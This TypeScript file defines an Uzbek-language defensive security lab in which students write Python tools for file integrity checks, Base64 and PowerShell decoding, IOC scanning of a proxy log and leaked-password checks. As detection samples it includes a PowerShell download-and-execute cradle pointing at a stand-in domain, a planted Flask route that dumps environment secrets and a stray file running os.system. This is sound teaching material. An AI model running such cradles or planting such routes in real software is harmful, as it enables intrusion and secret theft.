import type { Lab, LabCheckCtx } from '../types';
import { sha256Hex } from '../../engine/terminal/text';
import { pyCases, pyStr } from './pyHelpers';
import { edit, editFn } from './run';
import { ENCODED } from './siemIncident';

/* ── 3. Python security tools ────────────────────────────────────────── */

const DIR = '/home/talaba/vositalar';
const V = `${DIR}/vositalar.py`;
const P = (f: string) => pyStr(`${DIR}/${f}`);

// The web app as it was deployed (baseline) and as it is now.
const ORIGINAL: Record<string, string> = {
  'web/app.py': "from flask import Flask, render_template\n\napp = Flask(__name__)\n\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n",
  'web/config.py': "DEBUG = False\nSESSION_COOKIE_SECURE = True\n",
  'web/requirements.txt': 'flask==3.0.3\n',
  'web/templates/index.html': '<h1>Qaydnoma</h1>\n',
  'web/static/app.js': "console.log('qaydnoma');\n",
};
const CURRENT: Record<string, string> = {
  ...ORIGINAL,
  // Someone added a route that dumps the environment (secrets included).
  'web/app.py': ORIGINAL['web/app.py'] + "\n\n@app.route('/_diag')\ndef diag():\n    import os\n    return dict(os.environ)\n",
  // And dropped an unknown file next to the static assets.
  'web/static/.cache.py': "import os\nos.system('id')\n",
};
delete CURRENT['web/config.py'];
const BASELINE = Object.entries(ORIGINAL).map(([p, c]) => `${sha256Hex(c)}  ${p}`).join('\n') + '\n';
const INTEGRITY = {
  ozgargan: Object.keys(ORIGINAL).filter((p) => p in CURRENT && CURRENT[p] !== ORIGINAL[p]).sort(),
  yoq: Object.keys(ORIGINAL).filter((p) => !(p in CURRENT)).sort(),
  yangi: Object.keys(CURRENT).filter((p) => !(p in ORIGINAL)).sort(),
};

const IOCS = `# Tahdid ko'rsatkichlari (TI xabari, 2026-11-18)
# Har qatorda bitta IP yoki domen; # — izoh

203.0.113.45
update-check.example-cdn.net
198.51.100.88
telemetry.example-stats.net

# eski, lekin hali ham kuzatilyapti
cdn-sync.example
`;
const IOC_SET = IOCS.split('\n').map((l) => l.trim().toLowerCase()).filter((l) => l && !l.startsWith('#'));
const PROXY_LINES = [
  '2026-11-18T08:01:12Z 10.10.10.12 z.yusupova GET https://portal.mybank.uz/ 200',
  '2026-11-18T08:03:40Z 10.10.10.18 s.aliyeva GET https://docs.example.org/plan.pdf 200',
  '2026-11-18T08:05:02Z 10.10.20.47 i.mirzayev GET http://telemetry.example-stats.net/s.ps1 200',
  '2026-11-18T08:06:10Z 10.10.10.12 z.yusupova GET https://mail.example.com/inbox 200',
  '2026-11-18T08:07:44Z 10.10.20.47 i.mirzayev CONNECT 198.51.100.66:443 200',
  '2026-11-18T08:09:59Z 10.10.10.20 r.nazarov GET http://update-check.example-cdn.net/invoice/1147 200',
  '2026-11-18T08:11:31Z 10.10.10.15 b.ergashev GET https://soliq.example.uz/ 200',
  '2026-11-18T08:12:05Z 10.10.40.21 root GET http://198.51.100.88/u.sh 200',
  '2026-11-18T08:15:20Z 10.10.10.18 s.aliyeva GET https://cdn-sync.example/update 404',
];
const PROXY = PROXY_LINES.join('\n') + '\n';
const IOC_HITS = PROXY_LINES.flatMap((l, i) => IOC_SET.filter((ioc) => l.toLowerCase().includes(ioc)).map((ioc) => [i + 1, ioc] as const));
const LEAKED = ['123456', 'password', 'qwerty123', 'Parol2024!', 'admin', 'Toshkent2025', 'iloveyou', 'Qaydnoma123', 'Bahor-2026-Yoz', 'letmein'];
const CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://update-check.example-cdn.net/a.ps1')";

const STARTER = `# Kichik xavfsizlik vositalari. Tekshirish: python3 vositalar.py
import base64
import hashlib
import ipaddress
import os


def sha256_fayl(yol):
    """Faylning SHA-256 xeshi (hex). Faylni bayt sifatida o'qing: open(yol, 'rb')."""
    pass


def baseline_oqi(yol):
    """baseline.sha256 ("XESH  YO'L" qatorlari) dan {yo'l: xesh} lug'ati."""
    pass


def yaxlitlik(baseline_yol, ildiz):
    """{'ozgargan': [...], 'yoq': [...], 'yangi': [...]} — har biri saralangan yo'llar ro'yxati (ildizga nisbatan)."""
    pass


def b64_och(matn):
    """Base64 matnni ochib, UTF-8 satr qaytaradi."""
    pass


def ps_enc_och(matn):
    """PowerShell -EncodedCommand: Base64, ichida UTF-16LE matn."""
    pass


def ichki_ipmi(ip):
    """IP xususiy (ichki) tarmoqqa tegishlimi: 10.x, 172.16–31.x, 192.168.x ..."""
    pass


def tarmoqdami(ip, cidr):
    """IP berilgan tarmoq (CIDR) ichidami."""
    pass


def ioc_yukla(yol):
    """IOC faylidan to'plam (set): izoh (#) va bo'sh qatorlarsiz, kichik harfda."""
    pass


def ioc_topilmalar(log_yol, ioc_yol):
    """Logdagi IOC uchrashgan joylar: [(qator_raqami, ioc), ...], qator raqami 1 dan."""
    pass


def parol_sizganmi(parol, yol):
    """Parol sizib chiqqan parollar ro'yxatidami (aniq moslik)."""
    pass


def parol_qabulmi(parol, foydalanuvchi, yol):
    """(True, 'ok') yoki (False, sabab): sabab 'qisqa' (12 dan kam), 'sizgan' yoki 'ism' (parolda foydalanuvchi nomi bor)."""
    pass


if __name__ == "__main__":
    print("vositalar.py ishga tushdi")
`;

const ran = (c: LabCheckCtx, file: string) => new RegExp(`^\\s*python3\\s+${file.replace('.', '\\.')}(\\s|$)`).test(c.line);
const RUN = 'python3 vositalar.py';
const PY_SET = `{${IOC_SET.map(pyStr).join(', ')}}`;

export const pyTools: Lab = {
  id: 'python-vositalar',
  title: "Python: xavfsizlik vositalari",
  summary: "O'z vositalaringizni yozish: SHA-256 bilan fayl yaxlitligi tekshiruvi, Base64 va PowerShell -EncodedCommand ni ochish, ipaddress, IOC skaneri, sizib chiqqan parollar ro'yxati bilan tekshirish (NIST tavsiyasi).",
  minutes: 100,
  level: 2,
  panes: ['editor', 'terminal'],
  editor: { root: DIR, open: 'vositalar.py' },
  runtimes: ['python'],
  intro:
    "SOC va AppSec ishida tayyor vosita har doim ham bo'lmaydi — kichik skriptni o'zingiz yozasiz. Bu labda `vositalar.py` dagi funksiyalarni to'ldirib, ulardan ikki buyruq qatori vositasini yig'asiz.\n\n" +
    "Fayllar: `web/` — serverdagi veb-ilova, `baseline.sha256` — o'rnatilgan kundagi xeshlar (`sha256sum` formatida); `iocs.txt` — tahdid ko'rsatkichlari; `proxy.log`; `sizgan_parollar.txt` — sizib chiqqan parollar ro'yxati. b3 bosqichidagi yaxlitlik tekshiruvi, b1 dagi IOC va s5 dagi parol siyosati — endi kodda.\n\n" +
    "Har funksiya `python3 vositalar.py` da yashirin testlar bilan tekshiriladi.",
  shell: () => ({
    fs: {
      home: {
        talaba: {
          vositalar: {
            'vositalar.py': STARTER,
            'baseline.sha256': BASELINE,
            'iocs.txt': IOCS,
            'proxy.log': PROXY,
            'sizgan_parollar.txt': LEAKED.join('\n') + '\n',
            'yaxlitlik.py': "# Yaxlitlik hisoboti: python3 yaxlitlik.py\nfrom vositalar import yaxlitlik\n",
            'ioc_skaner.py': "# IOC skaneri: python3 ioc_skaner.py LOG IOC_FAYL\nimport sys\nfrom vositalar import ioc_topilmalar\n",
            web: { templates: {}, static: {} },
          },
        },
      },
      tmp: {},
    },
    cwd: DIR,
  }),
  tasks: [],
};

// The web/ tree is written file by file (paths with slashes).
const baseShell = pyTools.shell;
pyTools.shell = () => {
  const init = baseShell();
  const web = ((init.fs.home as Record<string, Record<string, Record<string, unknown>>>).talaba!.vositalar!.web) as Record<string, Record<string, string>>;
  for (const [path, content] of Object.entries(CURRENT)) {
    const parts = path.split('/').slice(1);
    let dir = web as Record<string, unknown>;
    for (const p of parts.slice(0, -1)) dir = (dir[p] ??= {}) as Record<string, unknown>;
    dir[parts[parts.length - 1]!] = content;
  }
  return init;
};

pyTools.tasks = [
  {
    id: 'sha256sum',
    teach: ['sha256sum -c'],
    text: "Avval tayyor vosita bilan: `sha256sum -c baseline.sha256` qaysi fayllar o'zgarganini ko'rsatadi. Natijani eslab qoling — keyin xuddi shuni Python'da yozasiz.",
    hint: '`sha256sum -c baseline.sha256` — OK, FAILED yoki "No such file".',
    solution: ['sha256sum -c baseline.sha256'],
    check: ({ line, output }) => line.includes('sha256sum') && output.includes('FAILED'),
  },
  {
    id: 'hash',
    teach: ['python3 FAYL'],
    text: "`sha256_fayl(yol)`: faylni bayt (`'rb'`) rejimida o'qib, `hashlib.sha256(...).hexdigest()` qaytarsin.",
    hint: "`with open(yol, 'rb') as f:` → `return hashlib.sha256(f.read()).hexdigest()`.",
    solution: [editFn('vositalar.py', 'sha256_fayl', "    with open(yol, 'rb') as f:\n        return hashlib.sha256(f.read()).hexdigest()"), RUN],
    ...pyCases(V, 'sha256_fayl', [[P('web/requirements.txt'), pyStr(sha256Hex(ORIGINAL['web/requirements.txt']!))], [P('web/app.py'), pyStr(sha256Hex(CURRENT['web/app.py']!))]]),
  },
  {
    id: 'baseline',
    text: "`baseline_oqi(yol)`: har qator `XESH  YO'L` (ikki bo'sh joy) — `{yo'l: xesh}` lug'atini qaytarsin.",
    hint: "`for q in open(yol):` → `xesh, yol_ = q.strip().split('  ', 1)` → `natija[yol_] = xesh`.",
    solution: [editFn('vositalar.py', 'baseline_oqi', "    natija = {}\n    for q in open(yol):\n        if q.strip():\n            xesh, nom = q.strip().split('  ', 1)\n            natija[nom] = xesh\n    return natija"), RUN],
    ...pyCases(V, 'baseline_oqi', [[P('baseline.sha256'), `{${Object.entries(ORIGINAL).map(([p, c]) => `${pyStr(p)}: ${pyStr(sha256Hex(c))}`).join(', ')}}`]]),
  },
  {
    id: 'integrity',
    text: "`yaxlitlik(baseline_yol, ildiz)`: baseline'dagi har fayl uchun xeshni qayta hisoblang. Natija: `ozgargan` (xesh boshqa), `yoq` (fayl o'chirilgan) va `yangi` (ildiz ostida bor, baseline'da yo'q — `os.walk` bilan toping) — har biri saralangan ro'yxat. `ildiz` — baseline'dagi yo'llar nisbatan olingan katalog.",
    hint: "`os.path.exists(os.path.join(ildiz, nom))`; yangi fayllar uchun `for papka, _, fayllar in os.walk(os.path.join(ildiz, 'web')):` va `os.path.relpath(yol, ildiz)`.",
    solution: [editFn('vositalar.py', 'yaxlitlik', "    asl = baseline_oqi(baseline_yol)\n    natija = {'ozgargan': [], 'yoq': [], 'yangi': []}\n    for nom, xesh in asl.items():\n        yol = os.path.join(ildiz, nom)\n        if not os.path.exists(yol):\n            natija['yoq'].append(nom)\n        elif sha256_fayl(yol) != xesh:\n            natija['ozgargan'].append(nom)\n    for papka, _, fayllar in os.walk(os.path.join(ildiz, 'web')):\n        for f in fayllar:\n            nom = os.path.relpath(os.path.join(papka, f), ildiz)\n            if nom not in asl:\n                natija['yangi'].append(nom)\n    for k in natija:\n        natija[k].sort()\n    return natija"), RUN],
    ...pyCases(V, 'yaxlitlik', [[`${P('baseline.sha256')}, ${pyStr(DIR)}`, `{"ozgargan": [${INTEGRITY.ozgargan.map(pyStr).join(', ')}], "yoq": [${INTEGRITY.yoq.map(pyStr).join(', ')}], "yangi": [${INTEGRITY.yangi.map(pyStr).join(', ')}]}`]]),
  },
  {
    id: 'integrity-script',
    text: "`yaxlitlik.py` ni yozing: hisobotni `O'ZGARGAN: web/app.py` kabi chiqarsin — avval O'ZGARGAN, keyin YO'Q, keyin YANGI qatorlari. Ishga tushiring. `web/static/.cache.py` ni oching (`cat`) — bu yerda nima qilinmoqda?",
    hint: "`r = yaxlitlik('baseline.sha256', '.')`, keyin uchta `for` sikli: `print(\"O'ZGARGAN:\", y)` va hokazo.",
    solution: [edit('yaxlitlik.py', "from vositalar import yaxlitlik\n\nr = yaxlitlik('baseline.sha256', '.')\nfor y in r['ozgargan']:\n    print(\"O'ZGARGAN:\", y)\nfor y in r['yoq']:\n    print(\"YO'Q:\", y)\nfor y in r['yangi']:\n    print('YANGI:', y)\n"), 'python3 yaxlitlik.py'],
    check: (c) => ran(c, 'yaxlitlik.py') && c.output.trim() === [...INTEGRITY.ozgargan.map((p) => `O'ZGARGAN: ${p}`), ...INTEGRITY.yoq.map((p) => `YO'Q: ${p}`), ...INTEGRITY.yangi.map((p) => `YANGI: ${p}`)].join('\n'),
  },
  {
    id: 'b64',
    text: "`b64_och(matn)`: Base64 matnni ochib, UTF-8 satr qaytarsin. (s1 bosqichidan eslang: Base64 — shifr emas, kodlash.)",
    hint: "`return base64.b64decode(matn).decode('utf-8')`",
    solution: [editFn('vositalar.py', 'b64_och', "    return base64.b64decode(matn).decode('utf-8')"), RUN],
    ...pyCases(V, 'b64_och', [[pyStr(btoa('salom dunyo')), '"salom dunyo"'], [pyStr(btoa('user:Qaydnoma123')), '"user:Qaydnoma123"']]),
  },
  {
    id: 'ps-enc',
    text: "`ps_enc_och(matn)`: PowerShell `-EncodedCommand` qiymati — Base64, lekin ichida **UTF-16LE** matn. WS-BUX-014 insidentidagi buyruqni o'zingiz oching.",
    hint: "`return base64.b64decode(matn).decode('utf-16-le')` — har belgi 2 bayt.",
    solution: [editFn('vositalar.py', 'ps_enc_och', "    return base64.b64decode(matn).decode('utf-16-le')"), RUN],
    ...pyCases(V, 'ps_enc_och', [[pyStr(ENCODED), pyStr(CRADLE)]]),
  },
  {
    id: 'private',
    text: "`ichki_ipmi(ip)`: `ipaddress.ip_address(ip).is_private` dan foydalaning.",
    hint: '`return ipaddress.ip_address(ip).is_private`',
    solution: [editFn('vositalar.py', 'ichki_ipmi', '    return ipaddress.ip_address(ip).is_private'), RUN],
    ...pyCases(V, 'ichki_ipmi', [['"10.10.10.23"', 'True'], ['"192.168.1.5"', 'True'], ['"172.20.0.1"', 'True'], ['"8.8.8.8"', 'False'], ['"172.32.0.1"', 'False']]),
  },
  {
    id: 'cidr',
    text: "`tarmoqdami(ip, cidr)`: IP shu tarmoq ichidami? (`ipaddress.ip_network`, `in`.) s2 bosqichidagi subnetting endi bir qator.",
    hint: '`return ipaddress.ip_address(ip) in ipaddress.ip_network(cidr)`',
    solution: [editFn('vositalar.py', 'tarmoqdami', '    return ipaddress.ip_address(ip) in ipaddress.ip_network(cidr)'), RUN],
    ...pyCases(V, 'tarmoqdami', [['"203.0.113.20", "203.0.113.16/29"', 'True'], ['"203.0.113.24", "203.0.113.16/29"', 'False'], ['"10.10.40.21", "10.10.0.0/16"', 'True']]),
  },
  {
    id: 'ioc-load',
    text: "`ioc_yukla(yol)`: `iocs.txt` dan to'plam: `#` bilan boshlangan va bo'sh qatorlarni tashlab, har birini kichik harfga o'tkazing.",
    hint: "`return {q.strip().lower() for q in open(yol) if q.strip() and not q.strip().startswith('#')}` — to'plam ifodasi.",
    solution: [editFn('vositalar.py', 'ioc_yukla', "    return {q.strip().lower() for q in open(yol) if q.strip() and not q.strip().startswith('#')}"), RUN],
    ...pyCases(V, 'ioc_yukla', [[P('iocs.txt'), PY_SET]]),
  },
  {
    id: 'ioc-scan',
    text: "`ioc_topilmalar(log_yol, ioc_yol)`: logning har qatorida (kichik harfda) qaysi IOC uchrashini toping — `[(qator_raqami, ioc), ...]`, qator raqami 1 dan, bir qatorda bir nechta bo'lsa — IOC nomi bo'yicha alfavit tartibida.",
    hint: "`for n, q in enumerate(open(log_yol), start=1):` → `for ioc in sorted(ioc_yukla(ioc_yol)):` → `if ioc in q.lower(): natija.append((n, ioc))`.",
    solution: [editFn('vositalar.py', 'ioc_topilmalar', "    iocs = sorted(ioc_yukla(ioc_yol))\n    natija = []\n    for n, q in enumerate(open(log_yol), start=1):\n        for ioc in iocs:\n            if ioc in q.lower():\n                natija.append((n, ioc))\n    return natija"), RUN],
    ...pyCases(V, 'ioc_topilmalar', [[`${P('proxy.log')}, ${P('iocs.txt')}`, `[${[...IOC_HITS].sort((a, b) => a[0] - b[0] || (a[1] < b[1] ? -1 : 1)).map(([n, i]) => `(${n}, ${pyStr(i)})`).join(', ')}]`]]),
  },
  {
    id: 'ioc-tool',
    teach: ['python3 ARGUMENT'],
    text: "`ioc_skaner.py` ni buyruq qatori vositasiga aylantiring: `python3 ioc_skaner.py proxy.log iocs.txt` har topilmani `QATOR: IOC` ko'rinishida chiqarsin (masalan `3: telemetry.example-stats.net`).",
    hint: "`for n, ioc in ioc_topilmalar(sys.argv[1], sys.argv[2]):` → `print(f\"{n}: {ioc}\")`.",
    solution: [edit('ioc_skaner.py', "import sys\nfrom vositalar import ioc_topilmalar\n\nfor n, ioc in ioc_topilmalar(sys.argv[1], sys.argv[2]):\n    print(f\"{n}: {ioc}\")\n"), 'python3 ioc_skaner.py proxy.log iocs.txt'],
    check: (c) => ran(c, 'ioc_skaner.py') && c.output.trim() === [...IOC_HITS].sort((a, b) => a[0] - b[0] || (a[1] < b[1] ? -1 : 1)).map(([n, i]) => `${n}: ${i}`).join('\n'),
  },
  {
    id: 'leaked',
    text: "`parol_sizganmi(parol, yol)`: parol `sizgan_parollar.txt` ro'yxatida bormi (aniq moslik). NIST tavsiyasi: yangi parolni sizib chiqqan parollar ro'yxati bilan solishtirish kerak.",
    hint: "`return parol in {q.rstrip('\\n') for q in open(yol)}` — to'plamda qidirish tez.",
    solution: [editFn('vositalar.py', 'parol_sizganmi', "    return parol in {q.rstrip('\\n') for q in open(yol)}"), RUN],
    ...pyCases(V, 'parol_sizganmi', [[`"Qaydnoma123", ${P('sizgan_parollar.txt')}`, 'True'], [`"qaydnoma123", ${P('sizgan_parollar.txt')}`, 'False'], [`"Tog'dagi-uch-ot-2026", ${P('sizgan_parollar.txt')}`, 'False']]),
  },
  {
    id: 'challenge',
    challenge: true,
    text: "Mustaqil vazifa. `parol_qabulmi(parol, foydalanuvchi, yol)`: ro'yxatdan o'tish formasi uchun tekshiruv. Tartib bilan: 12 belgidan qisqa → `(False, 'qisqa')`; sizgan ro'yxatda → `(False, 'sizgan')`; parolda foydalanuvchi nomi bor (katta-kichik harfga qaramay) → `(False, 'ism')`; aks holda `(True, 'ok')`. (Murakkablik qoidalari emas — NIST aynan shu uchtasini tavsiya qiladi.)",
    hint: "Uchta `if` va `return`; nom uchun `foydalanuvchi.lower() in parol.lower()`; `parol_sizganmi` ni qayta ishlating.",
    solution: [editFn('vositalar.py', 'parol_qabulmi', "    if len(parol) < 12:\n        return (False, 'qisqa')\n    if parol_sizganmi(parol, yol):\n        return (False, 'sizgan')\n    if foydalanuvchi.lower() in parol.lower():\n        return (False, 'ism')\n    return (True, 'ok')"), RUN],
    ...pyCases(V, 'parol_qabulmi', [
      [`"Qisqa-1", "aziz", ${P('sizgan_parollar.txt')}`, `(False, "qisqa")`],
      [`"Bahor-2026-Yoz", "aziz", ${P('sizgan_parollar.txt')}`, `(False, "sizgan")`],
      [`"Aziz-ning-paroli-77", "aziz", ${P('sizgan_parollar.txt')}`, `(False, "ism")`],
      [`"tog-daryo-shamol-9", "aziz", ${P('sizgan_parollar.txt')}`, `(True, "ok")`],
    ]),
  },
];
